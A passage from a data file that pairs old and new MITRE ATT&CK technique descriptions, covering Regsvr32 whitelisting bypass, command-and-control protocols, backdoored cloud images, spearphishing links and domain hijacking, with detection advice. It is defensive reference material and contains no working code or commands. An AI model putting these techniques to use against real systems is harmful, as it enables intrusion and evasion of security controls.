Adversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials.(Citation: AWS Temporary Security Credentials)

Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)  "
A144,T1117,2.0,3.0,Regsvr32,Regsvr32,"Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a ""Squiblydoo"" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via Component Object Model Hijacking. (Citation: Carbon Black Squiblydoo Apr 2016)

Detection: Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)

Platforms: Windows

Data Sources: Loaded DLLs, Process monitoring, Process command-line parameters, Windows Registry

Defense Bypassed: Process whitelisting, Anti-virus

Permissions Required: User, Administrator

Remote Support: No

Contributors: Casey Smith","Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: SubTee Regsvr32 Whitelisting Bypass) This variation of the technique is often referred to as a ""Squiblydoo"" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)"
A145,T1071,2.0,3.0,Standard Application Layer Protocol,Standard Application Layer Protocol,"Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP.

Detection: Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.  Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Process use of network, Malware reverse engineering, Process monitoring

Requires Network: Yes","Adversaries may communicate using a common, standardized application layer protocol such as HTTP, HTTPS, SMTP, or DNS to avoid detection by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are RPC, SSH, or RDP."
A146,T1204.003,9.0,10.0,Malicious Image,Malicious Image,"Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)

Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).","Adversaries may rely on a user running a malicious image to facilitate execution. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be backdoored. Backdoored images may be uploaded to a public repository via [Upload Malware](https://attack.mitre.org/techniques/T1608/001), and users may then download and deploy an instance or container from the image without realizing the image is malicious, thus bypassing techniques that specifically achieve Initial Access. This can lead to the execution of malicious code, such as code that executes cryptocurrency mining, in the instance or container.(Citation: Summit Route Malicious AMIs)

Adversaries may also name images a certain way to increase the chance of users mistakenly deploying an instance or container from the image (ex: [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005)).(Citation: Aqua Security Cloud Native Threat Report June 2021)"
A147,T1203,2.0,3.0,Exploitation for Client Execution,Exploitation for Client Execution,"Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Several types exist:

===Browser-based Exploitation===

Web browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

===Office Applications===

Common office and productivity applications such as Microsoft Office are also targeted through Spearphishing Attachment, Spearphishing Link, and Spearphishing via Service. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

===Common Third-party Applications===

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.

Detection: Detecting software exploitation may be difficult depending on the tools available. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the browser or Office processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.

Platforms: Linux, Windows, macOS

Data Sources: Anti-virus, System calls, Process Monitoring

System Requirements: Remote exploitation for execution requires a remotely accessible service reachable over the network or other vector of access such as spearphishing or drive-by compromise.

Remote Support: Yes","Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.

Several types exist:

### Browser-based Exploitation

Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1192). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

### Office Applications

Common office and productivity applications such as Microsoft Office are also targeted through [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193), [Spearphishing Link](https://attack.mitre.org/techniques/T1192), and [Spearphishing via Service](https://attack.mitre.org/techniques/T1194). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

### Common Third-party Applications

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
A148,T1566.002,10.0,11.0,Spearphishing Link,Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)","Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). 

Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)"
A149,T1584.001,12.0,13.0,Domains,Domains,"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.(Citation: Krebs DNS Hijack 2019)

Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)","Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.(Citation: ICANNDomainNameHijacking) Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.(Citation: Krebs DNS Hijack 2019)

Subdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.(Citation: Microsoft Sub Takeover 2020)

Adversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.(Citation: Palo Alto Unit 42 Domain Shadowing 2022)"
A150,T1032,2.0,3.0,Standard Cryptographic Protocol,Standard Cryptographic Protocol,"Adversaries use command and control over an encrypted channel using a known encryption protocol like HTTPS or SSL/TLS. The use of strong encryption makes it difficult for defenders to detect signatures within adversary command and control traffic.

Some adversaries may use other encryption protocols and algorithms with symmetric keys, such as RC4, that rely on encryption keys encoded into malware configuration files and not public key cryptography. Such keys may be obtained through malware reverse engineering.

Detection: SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks)

If malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)

In general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)

Platforms: Linux, macOS, Windows

Data Sources: Packet capture, Netflow/Enclave netflow, Malware reverse engineering, Process use of network, Process monitoring, SSL/TLS inspection

Requires Network: Yes","Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files."
